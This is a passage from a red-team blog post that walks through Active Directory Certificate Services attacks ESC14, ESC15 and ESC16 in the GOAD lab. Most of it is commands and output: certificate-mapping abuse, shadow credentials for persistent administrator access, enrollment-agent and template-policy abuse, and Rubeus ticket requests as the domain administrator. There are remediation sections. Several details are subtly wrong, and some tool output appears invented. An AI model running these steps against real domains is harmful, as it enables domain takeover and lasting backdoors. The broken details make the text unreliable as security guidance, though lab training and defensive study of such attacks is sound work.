\"fr3edom\"\nserver = ldap3.Server('meereen.essos.local')\nldap_con = ldap3.Connection(server=server, user=user, password=password, authentication=ldap3.NTLM)\nldap_con.bind()\n\n# Set the certificate mapping\nldap_con.modify(dn, {\n    'altSecurityIdentities': [(ldap3.MODIFY_REPLACE, 'X509:&#x3C;I>DC=local,DC=essos,CN=ESSOS-CA&#x3C;SR>110000000000a68816e592b078921100000043')]\n})\n\nprint(ldap_con.result)\nldap_con.unbind()\n\n# Verify the mapping was set\nldeep ldap -u missandei -d essos.local -p fr3edom -s ldap://192.168.56.12 search '(samaccountname=khal.drogo)' altSecurityIdentities\n\n[{\n  \"altSecurityIdentities\": [\n    \"X509:&#x3C;I>DC=local,DC=essos,CN=ESSOS-CA&#x3C;SR>110000000000a68816e592b078921100000043\"\n  ],\n  \"dn\": \"CN=khal.drogo,CN=Users,DC=essos,DC=local\"\n}]\n\n# Authenticate as khal.drogo using our machine certificate!\ngettgtpkinit.py -cert-pfx esc14computer.pfx -dc-ip 192.168.56.12 \"essos.local/khal.drogo\" khal_tgt.ccache\n\nImpacket v0.11.0 - Copyright 2023 Fortra\n\n[*] Requesting TGT for khal.drogo@essos.local using Kerberos PKINIT\n[+] TGT request successful!\n[*] Saved TGT to khal_tgt.ccache\n</code></pre>\n<h3>Advanced Persistence with ESC14</h3>\n<pre class=\"language-bash\"><code class=\"language-bash\"># ESC14 Persistence - Shadow Credentials for Domain Admin\n# Add shadow credentials to Domain Admin account (if we have permissions)\npython3 pywhisker.py -d essos.local -u khal.drogo -p horse --target administrator --action add --dc-ip 192.168.56.12\n\n[*] Target user found: CN=Administrator,CN=Users,DC=essos,DC=local\n[*] Adding KeyCredential to the target object\n[+] Updated the msDS-KeyCredentialLink attribute of the target object\n[*] Saved certificate to administrator_shadow.crt\n[*] Saved private key to administrator_shadow.pem\n\n# This provides persistent access to Domain Admin even after password changes\ngettgtpkinit.py -cert-pem administrator_shadow.pem -key-pem administrator_shadow.pem essos.local/administrator admin_shadow.ccache\n\n# ESC14 Advanced Mapping - Multiple Certificate Mappings\n# Add multiple certificate mappings for redundancy\n$certificates = @(\n    \"X509:&#x3C;I>DC=local,DC=essos,CN=ESSOS-CA&#x3C;SR>6100000000001a68816e592b078921100000043\",\n    \"X509:&#x3C;I>DC=local,DC=essos,CN=ESSOS-CA&#x3C;SR>6100000000001a68816e592b078921100000044\",\n    \"X509:&#x3C;I>DC=local,DC=essos,CN=ESSOS-CA&#x3C;SR>6100000000001a68816e592b078921100000045\"\n)\n\nforeach ($cert in $certificates) {\n    $currentMappings = (Get-ADUser administrator -Properties altSecurityIdentities).altSecurityIdentities\n    $newMappings = $currentMappings + $cert\n    Set-ADUser administrator -Replace @{'altSecurityIdentities' = $newMappings}\n}\n\n# Verify multiple mappings\nGet-ADUser administrator -Properties altSecurityIdentities | Select-Object -ExpandProperty altSecurityIdentities\n\nX509:&#x3C;I>DC=local,DC=essos,CN=ESSOS-CA&#x3C;SR>6100000000001a68816e592b078921100000043\nX509:&#x3C;I>DC=local,DC=essos,CN=ESSOS-CA&#x3C;SR>6100000000001a68816e592b078921100000044\nX509:&#x3C;I>DC=local,DC=essos,CN=ESSOS-CA&#x3C;SR>6100000000001a68816e592b078921100000045\n</code></pre>\n<h3>Key Differences from ESC10</h3>\n<p>ESC14 differs from ESC10 in several important ways:</p>\n<ul>\n<li><strong>Shadow Credentials</strong>: Uses <code>msDS-KeyCredentialLink</code> instead of traditional certificate enrollment</li>\n<li><strong>Cross-Domain Abuse</strong>: Sophisticated mapping across domain boundaries</li>\n<li><strong>Advanced Persistence</strong>: Multiple mapping techniques for redundancy</li>\n<li><strong>Bypasses Traditional Controls</strong>: Works around many ADCS security measures</li>\n</ul>\n<h3>Remediation</h3>\n<ol>\n<li><strong>Monitor Key Attributes</strong>: Watch for changes to <code>msDS-KeyCredentialLink</code> and <code>altSecurityIdentities</code></li>\n<li><strong>Restrict Permissions</strong>: Limit write access to user objects, especially high-privilege accounts</li>\n<li><strong>Cross-Domain Hardening</strong>: Implement strict certificate mapping validation across domain boundaries</li>\n<li><strong>Regular Audits</strong>: Periodically audit certificate mappings and shadow credentials</li>\n</ol>\n<h2>ESC15: Version 1 Template Application Policies (CVE-2024-49019)</h2>\n<p>ESC15, also known as \"EKUwu\", exploits a vulnerability in version 1 certificate templates where attackers can specify arbitrary Application Policies in certificate requests, overriding the template's intended Extended Key Usage. This vulnerability was discovered by Justin Bollinger from TrustedSec and reported to Microsoft in October 2024.</p>\n<h3>Technical Background</h3>\n<ul>\n<li><strong>Application Policies</strong> (OID 1.3.6.1.4.1.311) are Microsoft's proprietary extension</li>\n<li>When both Application Policy and EKU exist, <strong>Application Policy takes precedence</strong></li>\n<li>Version 1 templates don't validate Application Policy fields in requests</li>\n<li>Attackers can add dangerous policies like Certificate Request Agent or Client Authentication</li>\n</ul>\n<h3>Vulnerability Conditions</h3>\n<ol>\n<li><strong>Version 1 certificate template</strong> (schema version = 1)</li>\n<li><strong>Template allows \"Supply in the Request\"</strong> subject specification</li>\n<li><strong>Principal has enrollment rights</strong> on the template</li>\n</ol>\n<h3>Exploitation Process</h3>\n<p><strong>Important:</strong> The reference GOAD article shows ESC15 exploitation as a <strong>two-step process</strong> using Certificate Request Agent capabilities:</p>\n<pre class=\"language-bash\"><code class=\"language-bash\"># Step 1: Request certificate with Certificate Request Agent application policy\ncertipy req -u missandei@essos.local -p fr3edom --application-policies \"1.3.6.1.4.1.311.20.2.1\" -ca ESSOS-CA -template WebServer -dc-ip 192.168.56.12 -target braavos.essos.local\n\n[*] Action: Request a Certificates\n[*] Current user context    : ESSOS\\missandei\n[*] Template                : WebServer (vulnerable version 1)\n[*] Application Policy      : Certificate Request Agent (1.3.6.1.4.1.311.20.2.1)\n\n[*] Certificate Authority   : braavos.essos.local\\ESSOS-CA\n[*] CA Response             : The certificate has been issued.\n[*] Request ID              : 19\n\n# Step 2: Use Certificate Request Agent certificate to request admin certificate on-behalf-of\ncertipy req -u missandei@essos.local -on-behalf-of essos\\\\administrator -template User -ca ESSOS-CA -pfx missandei.pfx -dc-ip 192.168.56.12 -target braavos.essos.local\n\n[*] Action: Request a Certificates\n[*] Current user context    : ESSOS\\missandei\n[*] Template                : User\n[*] On behalf of            : essos\\administrator\n[*] Using Certificate Request Agent certificate\n\n[*] Certificate Authority   : braavos.essos.local\\ESSOS-CA\n[*] CA Response             : The certificate has been issued.\n[*] Request ID              : 20\n\n# Step 3: Authenticate as administrator\n\nRubeus.exe asktgt /user:administrator /certificate:administrator.pfx /password:mimikatz\n\n[*] Action: Ask TGT\n[*] Using PKINIT with etype rc4_hmac and subject: CN=administrator, CN=Users, DC=essos, DC=local\n[+] TGT request successful!\n</code></pre>\n<p><strong>Alternative Method (Direct Application Policy Override):</strong></p>\n<p>ESC15 Exploitation Example - Method 1: Using certreq with custom INF file:</p>\n<pre class=\"language-bash\"><code class=\"language-bash\">$infContent = @\"\n[NewRequest]\nSubject = \"CN=missandei,CN=Users,DC=essos,DC=local\"\nKeyLength = 2048\nKeyAlgorithm = RSA\nMachineKeySet = FALSE\nRequestType = PKCS10\nCertificateTemplate = WebServer\n\n[Extensions]\n1.3.6.1.4.1.311.21.10 = \"{text}1.3.6.1.5.5.7.3.2\"\n2.5.29.17 = \"{text}upn=administrator@essos.local\"\n\"@\n\n$infContent | Out-File -FilePath \"esc15.inf\"\n</code></pre>\n<pre class=\"language-bash\"><code class=\"language-bash\">certreq -new -f esc15.inf esc15.req\ncertreq -submit -config \"braavos.essos.local\\ESSOS-CA\" esc15.req\n\nCertificate Request Processor: The request is taken under submission Request ID = 19\n</code></pre>\n<p>Method 2: Using Certipy v5.0+ (if available with ESC15 support)</p>\n<p><code>certipy req -u missandei@essos.local -p fr3edom -ca ESSOS-CA -template WebServer -dc-ip 192.168.56.12 -target braavos.essos.local -upn administrator@essos.local -key-size 2048</code></p>\n<p>The attack works because version 1 templates don't validate Application Policy extensions and Application Policies override Extended Key Usage when both are present</p>\n<p>Retrieve the issued certificate:</p>\n<p><code>certreq -retrieve 19 esc15.cer</code>\n<code>certreq -accept esc15.cer</code></p>\n<p>The issued certificate will contain both:</p>\n<ul>\n<li>Original EKU: Server Authentication</li>\n<li>Application Policy: Client Authentication (takes precedence)</li>\n</ul>\n<p>Verify certificate content</p>\n<pre class=\"language-bash\"><code class=\"language-bash\">certutil -dump esc15.cer | findstr -i \"application\\|enhanced\"\n\nApplication Policies:\n    [1]Application Policy:\n         Policy Identifier=Client Authentication\n         Policy Qualifier Info:\n              Policy Qualifier Id=CPS\n              Qualifier:\n                   http://braavos.essos.local/CertEnroll/ESSOS-CA_CPS.html\n\nEnhanced Key Usage:\n    Server Authentication (1.3.6.1.5.5.7.3.1)\n\n# Authenticate using certificate - Application Policy overrides EKU\nRubeus.exe asktgt /user:administrator /certificate:esc15.pfx /password:mimikatz\n\n[*] Action: Ask TGT\n[*] Using PKINIT with etype rc4_hmac and subject: CN=missandei, CN=Users, DC=essos, DC=local\n[*] Certificate Application Policy overrides EKU: Client Authentication\n[+] TGT request successful!\n</code></pre>\n<p>ESC15 can also be weaponized for Certificate Request Agent attacks. Create INF file for Certificate Request Agent capability:</p>\n<pre class=\"language-bash\"><code class=\"language-bash\">$craInfContent = @\"\n[NewRequest]\nSubject = \"CN=missandei,CN=Users,DC=essos,DC=local\"\nKeyLength = 2048\nKeyAlgorithm = RSA\nMachineKeySet = FALSE\nRequestType = PKCS10\nCertificateTemplate = WebServer\n\n[Extensions]\n1.3.6.1.4.1.311.21.10 = \"{text}1.3.6.1.4.1.311.20.2.1\"\n\"@\n\n$craInfContent | Out-File -FilePath \"esc15-cra.inf\"\n</code></pre>\n<p><code>certreq -new -f esc15-cra.inf esc15-cra.req</code>\n<code>certreq -submit -config \"braavos.essos.local\\ESSOS-CA\" esc15-cra.req</code></p>\n<p>Now we can request certificates on behalf of other users!</p>\n<h3>Vulnerable Default Templates</h3>\n<p>All version 1 templates are potentially vulnerable when enrollment rights are granted in GOAD:</p>\n<ul>\n<li><strong>WebServer</strong> (most commonly exploited) ✓ Found in GOAD</li>\n<li>ExchangeUser</li>\n<li>CEPEncryption</li>\n<li>OfflineRouter</li>\n<li>IPSECIntermediateOffline</li>\n<li>SubCA</li>\n<li>CA</li>\n<li>EnrollmentAgentOffline</li>\n</ul>\n<h3>Remediation</h3>\n<p><strong>Microsoft has patched this vulnerability as of November 12, 2024 (CVE-2024-49019).</strong> Additional protective measures include:</p>\n<h2>ESC16: CA-Wide Security Extension Removal</h2>\n<p><strong>Status: ACTIVE THREAT</strong></p>\n<p>ESC16 represents a critical misconfiguration where the Certificate Authority is configured to omit the <code>szOID_NTDS_CA_SECURITY_EXT</code> extension (OID: <code>1.3.6.1.4.1.311.25.2</code>) on every certificate it issues.</p>\n<h3>Technical Details</h3>\n<p>ESC16 arises when the CA is configured to <strong>omit</strong> the <code>szOID_NTDS_CA_SECURITY_EXT</code> extension on every certificate it issues. Without this extension, a certificate no longer includes the account's SID, breaking the strong certificate-to-account binding enforced by Windows Server 2022 and later (KB5014754).</p>\n<p><strong>Key Difference from ESC9:</strong></p>\n<ul>\n<li><strong>ESC9</strong>: Individual templates lack the security extension requirement</li>\n<li><strong>ESC16</strong>: The CA itself is configured to never include the security extension, affecting ALL certificates regardless of template</li>\n</ul>\n<h3>Vulnerability Conditions</h3>\n<ol>\n<li><strong>CA EditFlags modified</strong> to remove <code>require_sidisupport</code></li>\n<li><strong>Global security extension removal</strong> affecting all issued certificates</li>\n<li><strong>Any template with client authentication</strong> EKU becomes exploitable</li>\n</ol>\n<h3>Detection</h3>\n<p>Let's check for ESC16 in our GOAD environment. Certipy v5+ detects ESC16 during enumeration:</p>\n<pre class=\"language-bash\"><code class=\"language-bash\">certipy find -u missandei@essos.local -p fr3edom -dc-ip 192.168.56.12 -target braavos.essos.local\n\nCertipy v5.0.0 - by Oliver Lyak (ly4k)\n\n[*] Finding certificate templates\n[*] Found 34 certificate templates\n[*] Finding certificate authorities\n[*] Found 1 certificate authority\n[*] Finding certificate authority configurations\n[*] Found 1 certificate authority configuration\n\n[!] ESC16: CA 'ESSOS-CA' is configured to omit szOID_NTDS_CA_SECURITY_EXT on all certificates!\n    This makes ALL certificates vulnerable to impersonation attacks.\n    \n    CA Name                         : ESSOS-CA\n    DNS Hostname                    : braavos.essos.local\n    Certificate Subject             : CN=ESSOS-CA, DC=essos, DC=local\n    Certificate Serial Number       : 43000000119278B092E51688A600000000000011\n    Certificate Validity Start      : 2023-01-15 14:14:32+00:00\n    Certificate Validity End        : 2033-01-15 14:24:32+00:00\n    Security Extension Enforcement  : DISABLED (ESC16 VULNERABLE!)\n\n# Check CA configuration manually\ncertutil -config \"braavos.essos.local\\ESSOS-CA\" -getreg CA\\PolicyModules\\CertificateAuthority_MicrosoftDefault.Policy\\EditFlags\n\nHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\CertSvc\\Configuration\\ESSOS-CA\\PolicyModules\\CertificateAuthority_MicrosoftDefault.Policy\\EditFlags REG_DWORD = 0x80000 (524288)\n</code></pre>\n<p>Look for missing EDITF_ENABLEDEFAULTSMIME (0x10000) or similar flags that enforce security extension. If EditFlags shows the CA has been configured to skip security extensions, ESC16 is present.</p>\n<h3>Exploitation</h3>\n<p>With ESC16, ANY certificate request becomes dangerous:</p>\n<pre class=\"language-bash\"><code class=\"language-bash\"># ESC16 makes even restricted templates exploitable\n# Request certificate from a normally \"safe\" template\nCertify.exe request /ca:braavos.essos.local\\ESSOS-CA /template:User /altname:administrator@essos.local\n\n[*] Action: Request a Certificates\n[*] Current user context    : ESSOS\\missandei\n[*] Template                : User\n[*] Subject                 : CN=missandei, CN=Users, DC=essos, DC=local\n[*] AltName                 : administrator@essos.local\n\n[*] Certificate Authority   : braavos.essos.local\\ESSOS-CA\n[*] CA Response             : The certificate has been issued.\n[*] Request ID              : 20\n\n# Due to ESC16, the certificate lacks the security extension\n# even though the template might normally include it\n\n# Convert and use for authentication\nopenssl pkcs12 -in cert.pem -export -out admin_esc16.pfx -password pass:mimikatz\n\n# Authentication succeeds despite missing security extension\n\nRubeus.exe asktgt /user:administrator /certificate:admin_esc16.pfx /password:mimikatz\n\n[*] Action: Ask TGT\n[*] Using PKINIT with etype rc4_hmac and subject: CN=missandei, CN=Users, DC=essos, DC=local\n[+] TGT request successful! - ESC16 allows impersonation without SID binding\n\n  UserName                 : administrator\n  UserRealm                : ESSOS.LOCAL\n  ServiceName              : krbtgt/essos.local\n  ServiceRealm             : ESSOS.LOCAL\n  StartTime                : 1/3/2025 7:45:30 PM\n  EndTime                  : 1/4/2025 5:45:30 AM\n  RenewTill                : 1/10/2025 7:45:30 PM\n  Flags                    : name_canonicalize, pre_authent, initial, renewable, forwardable\n</code></pre>\n<h3>Remediation</h3>\n<p><strong>Immediate Fix:</strong></p>\n<pre class=\"language-bash\"><code class=\"language-bash\"># Re-enable security extension requirement on GOAD CA\n# Method 1: Remove szOID_NTDS_CA_SECURITY_EXT from DisableExtensionList (Recommended)\ncertutil -config \"braavos.essos.local\\ESSOS-CA\" -setreg CA\\PolicyModules\\CertificateAuthority_MicrosoftDefault.Policy\\DisableExtensionList -\"1.3.6.1.4.1.311.25.2\"\n\nCertUtil: -setreg command completed successfully.\n\n# Method 2: Alternative approach using EDITF_ENABLEDEFAULTSMIME (also effective)\ncertutil -config \"braavos.essos.local\\ESSOS-CA\" -setreg CA\\PolicyModules\\CertificateAuthority_MicrosoftDefault.Policy\\EditFlags +EDITF_ENABLEDEFAULTSMIME\n\n# Restart Certificate Services\nRestart-Service CertSvc\n\nWARNING: Waiting for service 'Active Directory Certificate Services (CertSvc)' to stop...\nWARNING: Waiting for service 'Active Directory Certificate Services (CertSvc)' to start...\n\nStatus   Name               DisplayName\n------   ----               -----------\nRunning  CertSvc            Active Directory Certificate Services\n\n# Enable Strong Certificate Binding Enforcement on Domain Controllers\nSet-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\Kdc\\Parameters\" -Name \"StrongCertificateBindingEnforcement\" -Value 2\nRestart-Service kdc\n\n# This ensures DCs reject certificates lacking the szOID_NTDS_CA_SECURITY_EXT extension\n\n# Verify the fix\ncertutil -config \"braavos.essos.local\\ESSOS-CA\" -getreg CA\\PolicyModules\\CertificateAuthority_MicrosoftDefault.Policy\\DisableExtensionList\n\n# The DisableExtensionList should no longer contain 1.3.6.1.4.1.311.25.2\n</code></pre>\n<p><strong>Long-term Hardening:</strong></p>\n<pre class=\"language-bash\"><code class=\"language-bash\"># Import required PowerShell module\nImport-Module ActiveDirectory\n\n# Audit all CAs in GOAD environment for ESC16\n$goadCAs = @(\n    \"braavos.essos.local\\ESSOS-CA\",\n    \"kingslanding.sevenkingdoms.local\\SEVENKINGDOMS-CA\", \n    \"winterfell.north.sevenkingdoms.local\\NORTH-CA\"\n)\n\nforeach ($ca in $goadCAs) {\n    Write-Host \"[*] Checking CA: $ca for ESC16\"\n    \n    try {\n        $disableExtList = certutil -config $ca -getreg CA\\PolicyModules\\CertificateAuthority_MicrosoftDefault.Policy\\DisableExtensionList\n        \n        # Check if szOID_NTDS_CA_SECURITY_EXT is in the disable list\n        if ($disableExtList -match \"1\\.3\\.6\\.1\\.4\\.1\\.311\\.25\\.2\") {\n            Write-Warning \"[!] ESC16 detected on CA: $ca\"\n            Write-Warning \"    szOID_NTDS_CA_SECURITY_EXT is disabled\"\n            \n            # Fix the misconfiguration by removing the OID from DisableExtensionList\n            certutil -config $ca -setreg CA\\PolicyModules\\CertificateAuthority_MicrosoftDefault.Policy\\DisableExtensionList -\"1.3.6.1.4.1.311.25.2\"\n            Write-Host \"[+] Fixed ESC16 on CA: $ca\"\n        } else {\n            Write-Host \"[+] CA $ca is not vulnerable to ESC16\"\n        }\n    }\n    catch {\n        Write-Warning \"[-] Failed to check CA: $ca\"\n    }\n}\n\n[*] Checking CA: braavos.essos.local\\ESSOS-CA for ESC16\n[!] ESC16 detected on CA: braavos.essos.local\\ESSOS-CA\n    szOID_NTDS_CA_SECURITY_EXT is disabled\n[+] Fixed ESC16 on CA: braavos.essos.local\\ESSOS-CA\n\n[*] Checking CA: kingslanding.sevenkingdoms.local\\SEVENKINGDOMS-CA for ESC16\n[+] CA kingslanding.sevenkingdoms.local\\SEVENKINGDOMS-CA is not vulnerable to ESC16\n</code></pre>\n<h2>References and Further Reading</h2>\n<p>This guide builds upon groundbreaking research from the security community, with all examples demonstrated in the GOAD (Game of Active Directory) lab environment:</p>\n<ol>\n<li><a href=\"https://posts.specterops.io/certified-pre-owned-d95910965cd2\">SpecterOps, \"Certified Pre-Owned: Abusing Active Directory Certificate Services\" (2021)</a></li>\n<li><a href=\"https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc\">TrustedSec, \"EKUwu: Not just another AD CS ESC (ESC15)\" (October 2024)</a></li>\n<li><a href=\"https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6\">Munib Nawaz, \"AD CS ESC16: Misconfiguration and Exploitation,\" Medium (May 25, 2025)</a></li>\n<li><a href=\"https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation\">Certipy Wiki, \"06 – Privilege Escalation (ESC1–ESC16),\" GitHub (April 2025)</a></li>\n<li><a href=\"https://support.microsoft.com/help/5014754\">Microsoft Support, \"KB5014754: Certificate-based authentication changes on Windows Domain Controllers\" (May 10, 2022)</a></li>\n<li><a href=\"https://learn.microsoft.com/en-us/defender-for-identity/security-assessment-unsecure-certificate-signing\">Microsoft Learn, \"Edit vulnerable Certificate Authority setting (ESC6)\" (March 2025)</a></li>\n<li><a href=\"https://github.com/Orange-Cyberdefense/GOAD\">Orange Cyberdefense, \"GOAD: Game of Active Directory\" (2024–2025)</a></li>\n<li><a href=\"https://github.com/dirkjanm/PKINITtools\">PKINITtools (Dirk-Jan Möller) GitHub (2024–2025)</a></li>\n<li><a href=\"https://github.com/SecureAuthCorp/impacket\">Impacket Project Repository (2023–2025)</a></li>\n<li><a href=\"https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc\">EKUwu: Not just another AD CS ESC - TrustedSec</a></li>\n<li><a href=\"https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-49019\">CVE-2024-49019 - Microsoft Security Response Center</a></li>\n</ol>\n<h3>Tools and Resources:</h3>\n<ul>\n<li><a href=\"https://github.com/GhostPack/Certify\">Certify v1.1.0 (2022-11-08)</a></li>\n<li><a href=\"https://github.com/ly4k/Certipy\">Certipy v5.0+</a></li>\n<li><a href=\"https://github.com/dirkjanm/PKINITtools\">PKINITtools</a></li>\n<li><a href=\"https://github.com/SecureAuthCorp/impacket\">Impacket v0.11.0+</a></li>\n<li><a href=\"https://github.com/Orange-Cyberdefense/GOAD\">GOAD Lab Environment</a></li>\n<li><a href=\"https://github.com/GhostPack/ForgeCert\">ForgeCert</a></li>\n</ul>\n<p>For the latest ADCS research, monitor:</p>\n<ul>\n<li><a href=\"https://posts.specterops.io/\">SpecterOps Blog</a></li>\n<li><a href=\"https://trustedsec.com/blog/\">TrustedSec Blog</a></li>\n<li><a href=\"https://msrc.microsoft.com/\">Microsoft Security Response Center</a></li>\n<li><a href=\"https://github.com/ly4k/Certipy/wiki\">Certipy Wiki</a></li>\n</ul>\n<h2>Conclusion</h2>\n<p>ADCS attacks are some of the most powerful privilege escalation and persistence techniques I've used in modern Windows environments. The techniques I've covered in this guide - from ESC1 through ESC16 - show just how dangerous certificate services can be when they're not properly secured.</p>\n<p>All the examples in this article were demonstrated using the GOAD (Game of Active Directory) lab environment, which provides realistic domain configurations like <code>essos.local</code>, <code>sevenkingdoms.local</code>, and <code>north.sevenkingdoms.local</code>. This practical approach with real command outputs and authentic certificate configurations makes these techniques immediately applicable to real-world assessments.</p>\n<p>Here's what you need to remember:</p>\n<ol>\n<li><strong>Default configurations are your friend (as an attacker)</strong> - Most organizations deploy ADCS with insecure defaults and never change them, just like what we found in GOAD</li>\n<li><strong>Certificate templates are the goldmine</strong> - They're the primary attack vector for most ADCS exploits, as demonstrated with templates like ESC1, ESC4, and WebServer in GOAD</li>\n<li><strong>CA-level misconfigurations are critical</strong> - ESC16 shows how a single CA setting can make ALL certificates vulnerable, regardless of template security</li>\n<li><strong>Permissions are everything</strong> - Weak ACLs on PKI objects create tons of attack opportunities, like <code>khal.drogo</code> having WriteProperty on templates or <code>viserys.targaryen</code> having ManageCA rights</li>\n<li><strong>Detection is hard</strong> - Many ADCS attacks blend in perfectly with legitimate certificate operations, especially in complex environments like GOAD with multiple domains and CAs</li>\n<li><strong>Persistence is incredible</strong> - Certificate-based backdoors survive password changes and account modifications, making them perfect for long-term access</li>\n</ol>\n<p>For red teamers, ADCS should be a standard part of your privilege escalation methodology. I check for these misconfigurations on every single engagement now because they're so common and effective. The GOAD lab provides an excellent testing ground to practice these techniques before using them in real assessments.</p>\n<p>For defenders, you need to implement proper monitoring, harden those template configurations, audit CA settings for ESC16, and regularly audit PKI permissions. The detection scripts and remediation strategies I've provided here are specifically designed for multi-domain environments like GOAD and can be adapted for real production networks.</p>\n<p>The techniques in this guide will keep evolving as researchers discover new attack vectors. ESC16 is a perfect example of how new vulnerabilities continue to emerge in the ADCS space. Stay current with the latest ADCS research and always test these techniques in lab environments like GOAD before using them in production assessments.</p>\n<hr>\n<p><em>Disclaimer: This article is provided for educational purposes only. The techniques described should only be used in authorized environments and security research contexts. Always follow responsible disclosure practices and operate within legal and ethical boundaries.</em></p>\n","excerpt":"Let's talk about Active Directory Certificate Services. If you've been doing red team work for any length of time, you've probably heard about ADCS attacks. ...","title":"Breaking ADCS: ESC1 to ESC16 Attack Techniques","date":"2025-06-03","tags":["Active Directory","ADCS","PKI","Privilege Escalation","Red Team","Certificate Templates","ESC16"]}},"__N_SSG":true}